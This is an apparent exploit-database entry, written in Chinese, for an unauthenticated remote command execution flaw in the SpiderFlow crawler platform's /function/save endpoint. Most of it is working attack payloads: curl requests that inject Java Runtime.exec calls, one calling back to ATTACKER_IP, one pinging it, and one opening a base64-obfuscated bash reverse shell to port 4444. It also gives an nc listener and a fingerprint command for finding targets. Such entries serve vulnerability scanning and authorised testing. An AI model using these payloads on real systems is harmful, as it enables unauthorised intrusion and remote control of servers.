---
id: SPIDERFLOW-RCE
title: SpiderFlow save 远程命令执行漏洞
product: spiderflow
vendor: SpiderFlow
version_affected: "all versions"
severity: CRITICAL
tags: [rce, code_injection, 无需认证]
fingerprint: ["SpiderFlow", "spiderflow"]
---

## 漏洞描述

SpiderFlow 爬虫平台的自定义函数保存接口 `/function/save` 存在远程代码执行漏洞。攻击者可通过注入 Java 表达式调用 `Runtime.getRuntime().exec()` 执行任意系统命令。

## 影响版本

- SpiderFlow 所有版本

## 前置条件

- 无需认证（默认无需登录即可访问管理界面）

## 利用步骤

1. 向 `/function/save` 发送 POST 请求
2. 在 `script` 参数中注入 Java 表达式
3. 命令在服务器端执行

## Payload

### DNS 回调验证

```bash
curl -s "http://target/function/save" \
  -d "id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('curl http://ATTACKER_IP/callback');{"
```

### 执行命令

```bash
curl -s "http://target/function/save" \
  -d "id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('ping ATTACKER_IP');{"
```

### 反弹 Shell

```bash
curl -s "http://target/function/save" \
  -d "id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}');{"
```

## 验证方法

```bash
# DNS/HTTP 回调验证（盲注 RCE）
curl -s "http://target/function/save" \
  -d "id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('curl http://ATTACKER_IP/rce_test');{"
# 在 ATTACKER_IP 监听: nc -lvp 80
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "SpiderFlow"
```
